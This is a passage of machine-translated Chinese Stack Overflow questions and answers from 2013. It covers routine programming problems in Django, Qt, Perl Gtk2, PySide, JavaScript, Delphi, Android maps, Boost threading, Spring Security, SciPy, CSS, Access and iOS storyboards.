RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^([^/]*)/?$ $1.php
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ /404.php?url=http://%{HTTP_HOST}/$1 [L] 
```

# django - django当地时间

> ID：14469104
> 
> 赞同：1
> 
> 时间：2013-01-22T22:18:52.700
> 
> 标签：django, django-timezone

我正在尝试在我的模板中将 utc 时间转换为本地时间，并且出于某种原因这样做：

```
{% load tz %}

{% localtime on %}
{{ value }}
{% endlocaltime %} 
```

仍然给了我UTC的价值

然而

```
{{ value|localtime }} 
```

使用我的本地时区设置给我价值

将 settings.py 中的 USE_TZ 设置为 True 似乎也无济于事

知道我做错了什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T22:28:37.170

`{{ value }}`您尝试显示的日期/时间对象是一个简单的日期时间对象。天真的日期时间对象不会在模板标签中转换 - 您的第一个示例，但会在模板过滤器中转换 - 您的第二个示例。

[在此处查看第一个警告](https://docs.djangoproject.com/en/1.4/topics/i18n/timezones/#time-zone-aware-output-in-templates)

“天真”与日期时间对象的创建方式有关。有关如何更改日期/时间对象时间感知的信息 - 允许它在模板标签中使用 - 请查看[此线程](https://stackoverflow.com/questions/10667743/how-to-store-a-naive-datetime-in-django-1-4)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-17T06:33:18.920

我创建了一个简单的中间件来为你处理所有这些东西：

[https://github.com/Miserlou/django-easy-timezones](https://github.com/Miserlou/django-easy-timezones)

只需安装它并按照说明操作即可！

1.  安装 django-easy-timezones

    `pip install django-easy-timezones pytz pygeoip`

2.  将“easy-timezones”添加到您的 INSTALLED_APPS 设置中，如下所示：

    `INSTALLED_APPS = ( ... 'easy-timezones', )`

3.  将 EasyTimezoneMiddleware 添加到您的 MIDDLEWARE_CLASSES

    `MIDDLEWARE_CLASSES = ( ... 'easy-timezones.middleware.EasyTimezoneMiddleware', )`

4.  在设置文件中添加[MaxMind GeoIP 数据库](http://www.maxmind.com/en/geolocation_landing)的路径：

    `GEOIP_DATABASE = '/path/to/your/geoip/database/GeoIP.dat'`

5.  在模板中启用本地时间。

    `{% load tz %} The UTC time is {{ object.date }} {% localtime on %} The local time is {{ object.date }} {% endlocaltime %}`

6.  多田！

# c++ - 多个 QWidet 到一个 QMainWindow

> ID：14469106
> 
> 赞同：0
> 
> 时间：2013-01-22T22:18:57.347
> 
> 标签：c++, qt4, qwidget, qmainwindow

我目前正在学习 Qt，但我被困在使用多个 QWidget 和一个 QMainWindow 的问题上。

我已经设置了一个包含 2 个 QWidgets 和一个 QMainWindow 的项目。这是我使用它的想法：根据需要设计两个 QWidget，将它们添加到主窗口对象，将按钮连接到正确的插槽并在需要时切换中心小部件。所以我从一个 QMainWindow 开始，然后添加了两个 QWidget，包括 cpp 文件、h 文件和 ui 文件。在两个 QWidgets 上，我添加了一个 QPushButton，并将其命名为 pushButtonConvert。

然后我转到附加到 QMainWindow (mainwindow.cpp) 的 cpp 文件并执行以下操作：

```
EpochToHuman * epochToHuman = new EpochToHuman();
HumanToEpoch * humanToEpoch = new HumanToEpoch(); 
```

到目前为止，一切都很好。现在我想将按钮连接到主窗口对象中的插槽，但我找不到按钮。epochToHuman->pushButtonConvert 似乎不存在，我找不到任何其他方式来获取按钮。那么，根据 Qt，我是否以一种不正确的方式思考，或者我错过了什么？

澄清我想要的另一个尝试：我想在 QMainWindows 的 cpp 文件中使用 QWidget 中的元素。我希望能够做这样的事情：

```
//In object MainWindow.cpp
QWidget * a = new QWidget
//Let's say a is a custom widget with a label in it. This label is called Label
a->Label->setText("Hello, World!");
//This gives an error because a does not have a member called Label
//How can I change the text on the label of a?
//And I think if I will be able to change the text of this label, I will also be able to dance around with buttons as needed. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T23:33:23.573

您可以在 , 的构造函数中将`pushButtonConvert`按钮连接到：`MainWindow::convertFromEpochToHuman``MainWindow`

```
connect(epochToHuman->ui->pushButtonConvert, SIGNAL(clicked(bool)), this, SLOT(convertFromEpochToHuman())); 
```

您需要`ui`先将成员设为公开，就像您为`HumanToEpoch`.

您应该将小部件的声明移动到`MainWindow.h`：

```
// ...
private:
    Ui::MainWindow *ui;

    EpochToHuman * epochToHuman;
    HumanToEpoch * humanToEpoch;
 // ... 
```

并像这样初始化它们：

```
epochToHuman = new EpochToHuman(this);
humanToEpoch = new HumanToEpoch(this); 
```

# facebook - 保存 Facebook 应用程序。配置类型

> ID：14469107
> 
> 赞同：0
> 
> 时间：2013-01-22T22:18:58.210
> 
> 标签：facebook

我很想知道是否已经可以保存 Facebook 应用程序。配置类型并将此配置类型应用于其他 facebook 应用程序。亲切的问候。

尼古拉斯。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T22:23:53.920

使用 Selenium 或 Greasemonkey 怎么样：记录和生成应用程序 -> 轻松复制

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T22:20:45.060

没有。目前没有办法“导出”应用程序设置。此外，目前无法将设置导入应用程序。

# linux - Perl gtk2 窗口更新

> ID：14469108
> 
> 赞同：1
> 
> 时间：2013-01-22T22:18:59.600
> 
> 标签：linux, perl, unix, window, gtk2

最近，当我在 perl 中编写 gtk2 程序时，我遇到了一个小问题。我有一个主窗口，它使用标签和按钮中的变量来向用户显示一些数据。

```
my $label1 = Gtk2::Label->new ("IP ".$target_ip);
my $label2 = Gtk2::Label->new ("Port ".$target_port);
my $label3 = Gtk2::Label->new ("Threads ".$thread_number); 
```

在更新 $target_ip 变量（通过弹出窗口）或用户在我的主窗口中使用的任何其他变量之后，什么也没有发生，所以我的问题是如何在 Gtk2 中更新窗口，我尝试通过调用 window 重新绘制它再次运行，但由于某些原因，即使在发出 Gtk2->main_quit 之后旧的仍然保持不变。另外我知道这可能是一个蹩脚的问题，但我第一次使用 Gtk2 库来编写一个主要项目，我还不是它的专家。到目前为止，这是我的代码（$ok 变量代表弹出窗口中的确定按钮，它更新主窗口中的其他变量）

```
$ok->signal_connect (clicked => sub {
        $target_ip = $text_area->get_text;
        Gtk2->main_quit; #Pop-up window
        main_Gtk()
        #Rebuild Attack window with given parameters / variables 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-23T14:22:29.457

```
#!/usr/bin/perl
use strict;
use warnings;

use Glib qw/TRUE FALSE/;
use Gtk2 '-init';

my $window = Gtk2::Window->new('toplevel');
$window->signal_connect('delete_event' => sub { Gtk2->main_quit; });
$window->set_default_size(300, 200);

my $target_ip = '127.0.0.1';

my $label1 = Gtk2::Label->new ("IP ".$target_ip);

my $vbox = Gtk2::VBox->new(FALSE, 3);
$vbox->pack_start($label1, FALSE, FALSE, 4);

my $button = Gtk2::Button->new("Ok");
$vbox->pack_end($button, FALSE, FALSE, 4);

$button->signal_connect(clicked => sub {
    $target_ip = '88.88.88.88';
    $label1->set_label("IP ".$target_ip);  # That's what you need!!!
});

$window->add($vbox);
$window->show_all;

Gtk2->main(); 
```

# python - 使用不同类的函数连接信号

> ID：14469109
> 
> 赞同：1
> 
> 时间：2013-01-22T22:19:00.973
> 
> 标签：python, qt, pyside

你好我正在制作一个程序，我正在使用stackedLayout来显示程序中的不同“区域”。我想使用类来“分离”与某些领域相关的功能。例如，Area1 有一个开始按钮和一个清除按钮，当按下开始按钮时，它运行程序，当按下清除按钮时，区域被清除。当我在主类中定义要启动和清除的功能时，按钮工作正常，但是当我从另一个类调用它们时没有任何反应。

***主文件***

```
class Program(QtGui.QMainWindow, Interface.Ui_MainWindow):
    def __init__(self, parent=None):
        super(Program, self).__init__(parent)
        self.setupUi(self)

        run = hello()
        self.startButton.clicked.connect(run.hello1)
        self.clearButton.clicked.connect(run.hello2)

class hello(object):
    def hello1(self):
        print "start button"

    def hello2(self):
        print "stop button" 
```

有人可以解释为什么当我点击按钮时什么都没有打印吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T22:59:43.930

您没有保留对您的`hello`实例的引用。所以它是在`__init__`结束后收集的垃圾，并且在您按下按钮时不可用。

尝试将其存储为实例属性 ( `self.run`)，而不是局部变量 ( `run`)：

```
class Program(QtGui.QMainWindow, Interface.Ui_MainWindow):
    def __init__(self, parent=None):
        super(Program, self).__init__(parent)
        self.setupUi(self)

        self.run = hello()
        self.startButton.clicked.connect(self.run.hello1)
        self.clearButton.clicked.connect(self.run.hello2)

class hello(object):
    def hello1(self):
        print "start button"

    def hello2(self):
        print "stop button" 
```

# email - 邮件中的 X 标头代表什么？

> ID：14469110
> 
> 赞同：12
> 
> 时间：2013-01-22T22:19:07.113
> 
> 标签：email, email-headers

我想知道`X-`电子​​邮件中的所有标题代表什么。

*   难道它们真的只是一种习俗，每个人都可以编造出来吗？
*   他们是否记录在某处？我很快浏览了[RFC 5322](https://www.rfc-editor.org/rfc/rfc5322)。它似乎没有提到任何关于自定义标题的内容。
*   他们是何时或由谁介绍的？

感谢您在该领域提供了一些启示:)

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-01-22T22:34:12.353

[RFC822](https://www.rfc-editor.org/rfc/rfc822)（“ARPA Internet 文本消息格式标准”）在 4.7.4 和 4.7.5 节中指定，以“X-”开头的标头永远不会成为任何标准的一部分，因此可以用于特定于应用程序目的。

值得一提的是，最近的 BCP 文档[RFC6648](https://www.rfc-editor.org/rfc/rfc6648)（“Deprecating the 'X-' Prefix and Similar Constructs in Application Protocols”）建议将来避免使用“X-”前缀，作为标准和非标准化的标头没有很好的定义，当采用常用的非标准标头作为标准时，试图做出这样的区分是失败的。

# javascript - for循环中的Javascript if语句

> ID：14469117
> 
> 赞同：0
> 
> 时间：2013-01-22T22:19:40.517
> 
> 标签：javascript

请帮助我理解为什么我的代码没有像我期望的那样做出反应？

所以我在 for 循环中遍历值列表，然后如果它们匹配表单提交的值，它应该返回该值，如果它不匹配，它应该返回 -1。如果我在 if 条件中省略了 'else' 语句，它会起作用（如果没有匹配的值，显然不会返回 -1）。但是使用 else 时，它​​只会返回第一个值（在本例中为 10），否则它将始终返回 -1。（就像如果我输入 20，它会返回 -1，即使它在我的值列表中）

我在这里错过/不理解什么？

```
// reference the form
var myForm = document.getElementById('findValue');

// our list of random values
var values = [10,20,30,40,50,60,70,80,90,100,234,255,345,366,900,1000,1002,1025,2034];

// on form submit
myForm.onsubmit = function(evt) {

var valueToFind = document.getElementById('myValue').value;

    // do not let it refresh the page/send a query
    evt.preventDefault();

    for(var i = 0; i < values.length; i++) {

        if(valueToFind == values[i]) {
            alert(values[i]);
        }
        else {
            alert(-1);
            return false;
        }
    }

}; 
```

非常感谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T22:23:39.387

你不会让它搜索到最后。第一次没有匹配时，它会返回。

您应该在找到匹配项后立即发出警报，然后返回`true`以允许提交。如果不匹配，则`false`在循环后返回。

```
myForm.onsubmit = function(evt) {
    var valueToFind = document.getElementById('myValue').value;

    // do not let it refresh the page/send a query
    evt.preventDefault();

    for(var i = 0; i < values.length; i++) {

        if(valueToFind == values[i]) {
            alert(values[i]);
            return true;
        }
    }
    alert(-1);
    return false;
}; 
```

*编辑：`return`当我认为你的意思是别的东西时，你的问题使用了这项工作。*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T22:23:22.003

在查看第一个项目后，您总是会以一种或另一种方式返回。如果第一个不数学，你必须继续循环：

```
for(var i = 0; i < values.length; i++) 
{
    if(valueToFind == values[i]) 
    {
        alert(values[i]);
        return values[i];
    }
}
// only return false after the loop is complete with no match.
alert(-1);
return false; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T22:23:29.840

`return false`将结束循环，即使没有，您也会`-1`为每个不是输入的项目发出警报。

对于这种搜索，您应该检查条件是否为真，此时您使用它和 做一些事情`return`，并省略`else`. 然后在循环*之后*执行“如果它们都不匹配”代码。`for`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-22T22:25:06.557

发生这种情况是因为当找到时你应该中断循环而不是下一次迭代，而当没有找到时循环不应该用`return false`.

但是，在您的情况下，我将`found`在循环后使用标志和标志检查：

```
var found = false;
for (var i = 0; i < values.length; i++) {
    if (valueToFind === values[i]) {
        found = true;
        break;
    }
}
alert(found ? valueToFind : -1); 
```

另一个简短的方法是使用[`Array.indexOf`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/indexOf)方法：

```
alert(values.indexOf(valueToFind) > -1 ? valueToFind : -1); 
```

# mysql - delphi mysql ado 连接

> ID：14469118
> 
> 赞同：4
> 
> 时间：2013-01-22T22:19:39.837
> 
> 标签：mysql, delphi, delphi-xe3

我正在尝试让 ADO 连接在 Delphi XE3 中工作，但遇到了很大困难。

我的机器（Win7 x64）上安装了一个 ODBC 驱动程序，该驱动程序在 ODBC 数据源下显示为“mySQL ODBC 5.1 驱动程序”。mysql 5.5 版。

我的理解是我应该能够在表单上放置一个 TadoConnection 组件，然后为其分配适当的连接字符串，如下所示：

```
var
  conn: TADOConnection;

procedure TForm1.Button1Click(Sender: TObject);
begin
  conn := conn.Create(nil);
  conn.ConnectionString := 'DRIVER={MySQL ODBC 5.1 Driver}; SERVER=myserver; PORT=3306; DATABASE=mysql; UID=myuser; PASSWORD=mypassword;OPTION=3;';
  conn.Connected := true;
end; 
```

当我运行应用程序并单击按钮时，出现错误

> Project Project1.exe 引发异常类 EOleException，并带有消息“[Microsoft][ODBC Driver Manager] Data source name not found and no default driver specified”。

谁能帮我？我错过了什么？我已经尝试在网上寻找示例并且到目前为止没有任何乐趣..任何建议都非常受欢迎......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-22T08:50:53.730

您只需要检查您的 ODBC 驱动程序...转到控制面板...管理工具...并检查您拥有的 ODBC 驱动程序版本...然后使用正确的...例如，我使用的是最后一个版本MySQL ODBC。驱动程序={MySQL ODBC 5.2 ANSI 驱动程序}

# java - Android Google Maps v2 多边形性能问题？

> ID：14469122
> 
> 赞同：5
> 
> 时间：2013-01-22T22:19:52.060
> 
> 标签：java, android, google-maps, google-maps-api-2

我正在将[Google maps v2](https://developers.google.com/maps/documentation/android/) api 用于我正在构建的必须在地图上绘制多边形的 Android 应用程序。当多边形数量较少时，一切正常，当多边形数量较大时，地图加载缓慢并且平移和缩放非常慢。我正在使用 SupportMapFragment 并添加如下多边形：

```
 for(PolygonOptions item : items) { 
            getMap().addPolygon(poly);
    } 
```

有什么方法可以提高大量多边形的性能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-05T20:56:36.167

我还想在背景的地图上绘制许多多边形，因为加载和组装顶点需要时间。对我有用的解决方案是在 AsyncTask 中加载数据，然后将每个多边形的点传递给 onProgressUpdate 方法中的主 UI 中的方法。

```
private class AddZonesTask extends AsyncTask<Zone, Zone, Integer> {
  protected Integer doInBackground(Zone... zones) {
    for (Zone zone : zones) {
      Cursor cursor = provider.query( .... );
      List<Points> points = cursorToPointsMethod(cursor);
      zone.add(points);
      publishProgress(zone);
    }
  return zones.length;
  }

  protected void onProgressUpdate(Zone... zones) {
    drawBorder(zones[0]);
  }

  protected void onPostExecute(Integer result) { }
} 
```

然后主 UI 中的 drawBorder 将它们添加到地图对象中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-01T18:10:13.607

Bobbake4 是正确的。Android 要求 addPolygon 位于主线程上。我也有类似的问题。目前我正在实现 asynctask 但似乎没有办法从`doInBackground`我当前的代码执行 addPolygon 如下：

```
 private class AddPolygonToMap extends
        AsyncTask<String, Integer, ArrayList<PolygonOptions>> {

    @Override
    protected ArrayList<PolygonOptions> doInBackground(String... urls) {
        publishProgress(1);
        return drawPolygonWithPage(urls[0]);
    }

    @Override
    protected void onProgressUpdate(Integer... progress) {
        int value = progress[0] + progressBar.getProgress();
        progressBar.setProgress(value);
    }

    @Override
    protected void onPostExecute(ArrayList<PolygonOptions> result) {
        for (int i = 0; i < result.size(); i++) {
            map.addPolygon(result.get(i));
        }
    }
} 
```

理想情况下，我想要 addPolygon 背景......还有其他方法可以完成这项工作吗？

# c++ - EXC_BAD_ACCESS 错误？提升多线程/互斥异常

> ID：14469124
> 
> 赞同：2
> 
> 时间：2013-01-22T22:20:04.510
> 
> 标签：c++, multithreading, boost, mutex, unlock

我似乎很难理解下面的代码有什么问题。该程序运行正确，但在行

```
startCounter.join(); 
```

我的程序似乎崩溃了，错误代码为 EXC_BAD_ACCESS（代码=13，地址=0x0）。我正在使用 XCode。

直到该行正常工作为止的所有内容；当另一个线程无限期地递增该值时，程序每秒打印出 n 的值。我究竟做错了什么？

```
#include <iostream>
#include <boost/thread.hpp>

boost::mutex mtx;

class Worker
{
public:
    Worker(int n);
    void increment();
    void printValue();
private:
    int n;
};

int main()
{
    Worker test(5);

    boost::thread startCounter(boost::bind(&Worker::increment, &test));
    std::cout << "Increment Thread Started..." << std::endl;

    boost::thread startPrinter(boost::bind(&Worker::printValue, &test));
    std::cout << "Print Thread Started..." << std::endl;

    startPrinter.join();
    startCounter.join();

    std::cout << "Program Complete." << std::endl;

    return EXIT_SUCCESS;
}

Worker::Worker(int n) : n(n)
{
    std::cout << "Initial Value: " << n << std::endl;
}

void Worker::increment()
{
    for (int i = 0; i < 60000000; i++) {
        boost::lock_guard<boost::mutex> lock(mtx);
        n = i;
    }

    std::cout << "Increment Thread Finished. Final Value: " << n << "." << std::endl;
}

void Worker::printValue()
{
    for (int i = 0; i < 10; i++) {
        {
            boost::lock_guard<boost::mutex> lock(mtx);
            std::cout << "Current value: " << n << std::endl;
        }
        boost::this_thread::sleep(boost::posix_time::milliseconds(1000));
    }

    std::cout << "Print Thread Finished." << std::endl;
} 
```

非常感谢！

# facebook - Facebook个人资料到粉丝页面和来自网页的喜欢

> ID：14469128
> 
> 赞同：-1
> 
> 时间：2013-01-22T22:20:13.133
> 
> 标签：facebook, web, facebook-like, fan-page

**初始点：**

1.  我有一个网页，比如说，100 个赞。
2.  我还有一个 Facebook 个人资料，有 300 个朋友。
3.  它开始是两个不同的东西，但结果是相同的。然而，这 100 个赞并非来自 Facebook 个人资料中的好友。

**问题：**
显然，我想做的是两全其美。
我怎样才能将我的个人资料转换成粉丝页面（是的，我知道[怎么做](http://www.facebook.com/help/175644189234902/)），同时还能让我所有的朋友都喜欢我的网页（当然这听起来太好了！）。

换句话说，是否可以将我的网页链接到新的粉丝页面，以使网页的喜欢不会丢失，并且喜欢我的粉丝页面的每个人也喜欢我的网页（反之亦然）？

如果没有，你会建议我做什么？只是重置页面上的喜欢并重新开始？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T22:27:31.453

不幸的是，我真的不认为这是可能的。我相信你可以想象为什么 - 如果可能的话，那么在 Facebook 上点赞任何东西都不是很安全，因为有人可以将它与完全不相关的网页或粉丝页面合并，而无需与现有用户再次确认“点赞” /喜欢的人。

# spring - Spring security 3.1：在哪里使用 PasswordEncoder 检查用户密码

> ID：14469129
> 
> 赞同：2
> 
> 时间：2013-01-22T22:20:20.547
> 
> 标签：spring, authentication, spring-security

由于 Spring Security 3.1 提供了一个新的方便的 PasswordEncoder 和一个实现 StardardPasswordEncoder，我尝试将它们实现到当前项目中。但是，在保存/验证用户密码时 PasswordEncoder 应该如何工作存在疑问。这是新 PasswordEncoder 的代码：

```
 private static final String SALT_AS_TOP_SECRET = "mysalt"; 
    private static final PasswordEncoder encoder = new StandardPasswordEncoder(
        SALT_AS_TOP_SECRET);

    public static String encrypt(String rawPassword) {
        return encoder.encode(rawPassword);
    }

    public static boolean match(String rawPassword, String password) {
        return encoder.matches(rawPassword, password);
    } 
```

我的应用程序是带有 JPA 的 Spring，因此有一个 User 实体使用基本的 getter/setter 实现 UserDetails 作为密码，还有一个服务类在服务层实现 UserDetailService。

我对 UserDetailService 只需要一个`loadUserByUsername`不检查密码的方法感到困惑。所以这里有其他问题：

1.  我应该将`match`PasswordEncoder 中的方法放在哪里？
2.  我应该为服务类实现另一个接口吗？
3.  设置密码时，我应该在用户实体中给出任何逻辑吗？
4.  由于新的 PasswordEncoder 接口独立于其他安全包，我敢打赌不需要从 xml 启动/注入 bean？我尝试将盐放入课堂而不是外部存储。

请给个提示，提前谢谢。

# numpy - Scipy：稀疏矩阵给出不正确的值

> ID：14469131
> 
> 赞同：1
> 
> 时间：2013-01-22T22:20:33.330
> 
> 标签：numpy, scipy, sparse-matrix

下面是我生成稀疏矩阵的代码：

```
import numpy as np
import scipy

def sparsemaker(X, Y, Z):
    'X, Y, and Z are 2D arrays of the same size'
    x_, row = np.unique(X, return_inverse=True)
    y_, col = np.unique(Y, return_inverse=True)
    return scipy.sparse.csr_matrix( (Z.flat,(row,col)), shape=(x_.size, y_.size) )

>>> print sparsemaker(A, B, C) #A, B, and C are (220, 256) sized arrays.
(0, 0)  167064.269831
(0, 2)  56.6146564629
(0, 9)  53.8660340698
(0, 23) 80.6529717039
(0, 28) 0.0
(0, 33) 53.2379218326
(0, 40) 54.3868995375
 :          : 
```

现在我的输入数组有点大，所以我不知道如何在这里发布它们（除非有人有任何想法）；但即使看第一个值，我已经可以看出有什么问题：

```
>>> test = sparsemaker(A, B, C)
>>> np.max(test.toarray())
167064.26983076424

>>> np.where(C==np.max(test.toarray()))
(array([], dtype=int64), array([], dtype=int64)) 
```

有谁知道为什么会发生这种情况？那价值从何而来？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T22:53:29.720

您有重复的坐标，构造函数将它们全部加起来。请执行下列操作 ：

```
x_, row = np.unique(X, return_inverse=True)
y_, col = np.unique(Y, return_inverse=True)
print Z.flat[(row == 0) & (col == 0)].sum() 
```

你应该把那个神秘的东西`167064.26983076424`打印出来。

**编辑**下面的丑陋代码适用于平均重复条目的小例子，一些代码是从[另一个问题](https://stackoverflow.com/questions/8560440/removing-duplicate-columns-and-rows-from-a-numpy-2d-array)中借来的，试一试：

```
def sparsemaker(X, Y, Z):
    'X, Y, and Z are 2D arrays of the same size'
    x_, row = np.unique(X, return_inverse=True)
    y_, col = np.unique(Y, return_inverse=True)
    indices = np.array(zip(row, col))
    _, repeats = np.unique(indices.view([('', indices.dtype)]*2),
                           return_inverse=True)
    counts = 1\. / np.bincount(repeats)
    factor = counts[repeats]

    return scipy.sparse.csr_matrix((Z.flat * factor,(row,col)),
                                   shape=(x_.size, y_.size)) 
```

# css - CSS过渡不起作用

> ID：14469134
> 
> 赞同：0
> 
> 时间：2013-01-22T22:20:36.517
> 
> 标签：css

我正在尝试创建一个一次只显示/隐藏一个菜单的容器系统。它在大多数情况下都有效，但我无法让 CSS 过渡正常工作。我已经看了几个小时，无法弄清楚为什么根本没有发生转换。

单击容器时，菜单需要下拉并向上滚动。我只需要一个起点，当用户单击容器时会发生某种转换。

CSS：

```
.singledrop {
    display: none;
}
.singledroplabel h2 {
    display: inline;
    color: #4e4e50;
}
.singledrop+.content {
    display: none;
    height: 0px;
    transition: height 0.2s ease-in-out;
    -webkit-transition: height 0.2s ease-in-out;
    -moz-transition: height 0.2s ease-in-out;
    -ms-transition: height 0.2s ease-in-out;
}
.singledrop:checked+.content {
    display: block;
    height: auto;
} 
```

HTML：

```
<div>
    <label class="singledroplabel" for="drop1"><h2>Foo</h2></label>
    <input class="singledrop" type="radio" name="menu" id="drop1" />
    <div class="content">
        foo<br/>
        foo<br/>
        foo<br/>
        foo<br/>
        foo<br/>
        foo<br/>
        foo<br/>
    </div>
</div>
<div>
    <label class="singledroplabel" for="drop2"><h2>Bar</h2></label>
    <input class="singledrop" type="radio" name="menu" id="drop2" />
    <div class="content">
        bar<br/>
        bar<br/>
        bar<br/>
        bar<br/>
        bar<br/>
        bar<br/>
        bar<br/>
    </div>
</div> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T22:25:39.753

你不能动画到`height:auto`. 尝试硬编码一个高度，或者设置`max-height`一个巨大的东西。

[http://jsfiddle.net/adambiggs/MAbD3/](http://jsfiddle.net/adambiggs/MAbD3/)

是最大高度方法的一个很好的例子。

# ms-access - 加速 Access 2010 运行时

> ID：14469137
> 
> 赞同：0
> 
> 时间：2013-01-22T22:20:49.140
> 
> 标签：ms-access, ms-access-2010

我最近将一些访问客户端（专有应用程序）升级到 2010 运行时，速度非常慢。UI 以极低的延迟运行 MS-SQL Server。滞后似乎来自前端的图形。例如，当您更改选项卡时，旧 PC 上的 CPU 峰值会达到 50% 或 75%。

有谁知道加快运行时间的任何技巧？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-25T21:34:28.800

我没有看到任何真正的性能差异。您我想关闭主题并查看渲染问题是否导致此问题。

作为一般规则，VBA 的速度在 2010 年与以前的版本相同（运行一些基准代码）。

你会发现一些减速的地方是引用表单上大量文本框属性的代码（原因是控件的属性数量大约是我之前的 4 倍——打印输出的属性曾经是关于一页左右的, 现在我相信仅针对单个文本框和属性的打印输出约为 6 页。因此，对许多控件属性进行大量更改的代码通常会受到怀疑并且运行速度会变慢。

但是，表单的一般加载和显示在这里并不是真正值得注意的问题。目前尚不清楚您是否在所有形式或只是一些形式上都遇到了这种情况。通常罪魁祸首是糟糕的代码或太多的数据被拉入表单，而不是表单渲染速度。

制作表单副本，然后删除所有数据源（包括组合框数据源）。现在试试那个表格，它是否仍然加载缓慢而没有任何数据？

所以一般的 VBA 代码速度在这里应该不会有太大变化。如前所述，我也会尝试关闭主题。我还假设您在这里分发了一个 accDE 文件，因为这也有助于提高速度。

# ios - 为什么这个故事板没有实例化？

> ID：14469140
> 
> 赞同：1
> 
> 时间：2013-01-22T22:20:56.450
> 
> 标签：ios, xcode, storyboard

我完全以编程方式在 iOS 中工作，并且完全使用 IB 工作，但我第一次尝试将两者混合在一起，我感到困惑。我正在编写一个选项卡式应用程序。在我的应用程序委托中，我曾经有以下代码：

```
//...Code setting view controllers for various tab items and then this...

GHSettingsViewController *svc = [[GHSettingsViewController alloc] init];
svc.tabBarItem.title = @"Settings";
svc.tabBarItem.image = [UIImage imageNamed:@"20-gear-2.png"];
[tabItems addObject:svc]; 
```

那很好。

然后我通过 IB 中的故事板创建了一个视图控制器，并向其添加了一堆 UI 元素，并为其提供了以下设置：

![在此处输入图像描述](../Images/4f22c25af4c432f13331c894b2659cae.png)

现在我的代码如下：

```
UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"Storyboard" bundle:nil];
GHSettingsViewController *svc = [storyboard instantiateViewControllerWithIdentifier:@"settings"];
svc.tabBarItem.title = @"Settings";
svc.tabBarItem.image = [UIImage imageNamed:@"20-gear-2.png"];
[tabItems addObject:svc]; 
```

应用程序启动正常，但是当我按下选项卡转到设置屏幕时，我收到以下消息：

![在此处输入图像描述](../Images/6b22fe3aa3a689e47e6fd8b1f80ca7df.png)

这是什么意思，我该如何解决？

**编辑：**这是来自应用程序委托的代码的更完整版本`didFinishLaunching`： { self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]]; [self.window makeKeyAndVisible];

```
NSMutableArray *tabItems = [[NSMutableArray alloc] initWithCapacity:5];

GHHaikuViewController *hvc = [[GHHaikuViewController alloc] init];
hvc.tabBarItem.title = @"Home";
hvc.tabBarItem.image = [UIImage imageNamed:@"53-house.png"];
[tabItems addObject:hvc];

GHComposeViewController *cvc = [[GHComposeViewController alloc] init];
cvc.tabBarItem.title = @"Compose";
cvc.tabBarItem.image = [UIImage imageNamed:@"216-compose.png"];
[tabItems addObject:cvc];

GHWebViewController *wvc = [[GHWebViewController alloc] init];
wvc.tabBarItem.title = @"Buy";
wvc.tabBarItem.image = [UIImage imageNamed:@"80-shopping-cart.png"];
[tabItems addObject:wvc];

GHFeedback *fvc = [[GHFeedback alloc] init];
fvc.tabBarItem.title = @"Feedback";
fvc.tabBarItem.image = [UIImage imageNamed:@"18-envelope.png"];
[tabItems addObject:fvc];

UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"Storyboard" bundle:nil];
//UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"Storyboard.storyboard" bundle:nil]; //Using this instead causes the application to crash on launching.
GHSettingsViewController *svc = [storyboard instantiateViewControllerWithIdentifier:@"settings"]; 
//GHSettingsViewController *svc = [storyboard instantiateInitialViewController]; //Using this instead of the line above causes the same error.
svc.tabBarItem.title = @"Settings";
svc.tabBarItem.image = [UIImage imageNamed:@"20-gear-2.png"];
[tabItems addObject:svc];

GHTabBarController *tbc = [[GHTabBarController alloc] init];
tbc.viewControllers = tabItems;
self.window.rootViewController = tbc;

return YES; 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T22:30:06.480

看起来您`UIViewController`在`UITabBarController`. 在`application:didFinishLaunchingWithOptions:`中，照原样创建新`UIStoryboard`的。然后创建一个`UIViewController`实例

```
UIViewController *viewController = [storyboard instantiateInitialViewController]; 
```

然后，只需添加`viewController`到`viewControllers`您的`UITabBarController`.

我不确定这`tabItems`是做什么用的，但是您需要将视图控制器添加到标签栏的`viewControllers`数组中。

**更新：**从我们在聊天中的讨论中，Storyboard 中引用了一个额外的 IBOutlet，它实际上并没有连接并导致崩溃。在调试导航器中点击“继续”按钮给了我们一些额外的信息并导致了问题。

# html - 实时数学网络表格

> ID：14469144
> 
> 赞同：-1
> 
> 时间：2013-01-22T22:21:54.610
> 
> 标签：html, forms, dynamic, real-time

对于这样一个基本问题，我提前道歉，但搜索谷歌不断返回基本上不相关的答案。

我想制作一个实时数学的网络表单。就这么简单。例如，我在一个框中输入 5，然后 20 立即出现在它下方的一个框中。这是因为它在运行中将它乘以 4。我删除了 5 并替换为 20 和繁荣，有一个 80。

